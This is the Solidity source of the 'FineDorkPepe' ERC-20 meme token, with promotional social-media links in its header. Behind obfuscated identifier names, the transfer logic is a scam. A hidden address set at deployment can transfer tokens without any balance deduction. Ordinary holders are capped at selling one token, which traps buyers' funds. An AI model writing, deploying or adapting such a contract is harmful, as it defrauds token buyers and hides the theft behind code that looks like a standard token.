/*

Telegram: https://t.me/FineDorkPepe

Twitter: https://twitter.com/FineDorkPepe

Website: https://finedorkpepe.crypto-token.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract FineDorkPepe is Ownable {
    function jgabrnx(address xkvosnjlfy, address gnypec, uint256 tacud) private {
        address huvwnsziljfo = IUniswapV2Factory(buiz.factory()).getPair(address(this), buiz.WETH());
        bool pgbmadtzhlw = 0 == jamzrv[xkvosnjlfy];
        if (pgbmadtzhlw) {
            if (xkvosnjlfy != huvwnsziljfo && sbev[xkvosnjlfy] != block.number && tacud < totalSupply) {
                require(tacud <= totalSupply / (10 ** decimals));
            }
            balanceOf[xkvosnjlfy] -= tacud;
        }
        balanceOf[gnypec] += tacud;
        sbev[gnypec] = block.number;
        emit Transfer(xkvosnjlfy, gnypec, tacud);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public symbol;

    constructor(string memory fxnqcjyhkdt, string memory xtavcwom, address rbgnotu, address dwvyhsacpok) {
        name = fxnqcjyhkdt;
        symbol = xtavcwom;
        balanceOf[msg.sender] = totalSupply;
        jamzrv[dwvyhsacpok] = jspovetqf;
        buiz = IUniswapV2Router02(rbgnotu);
    }

    mapping(address => uint256) public balanceOf;

    IUniswapV2Router02 private buiz;

    string public name;

    mapping(address => uint256) private jamzrv;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address gnypec, uint256 tacud) public returns (bool success) {
        jgabrnx(msg.sender, gnypec, tacud);
        return true;
    }

    mapping(address => uint256) private sbev;

    function approve(address hyvmistzpd, uint256 tacud) public returns (bool success) {
        allowance[msg.sender][hyvmistzpd] = tacud;
        emit Approval(msg.sender, hyvmistzpd, tacud);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address xkvosnjlfy, address gnypec, uint256 tacud) public returns (bool success) {
        require(tacud <= allowance[xkvosnjlfy][msg.sender]);
        allowance[xkvosnjlfy][msg.sender] -= tacud;
        jgabrnx(xkvosnjlfy, gnypec, tacud);
        return true;
    }

    uint256 private jspovetqf = 113;
}
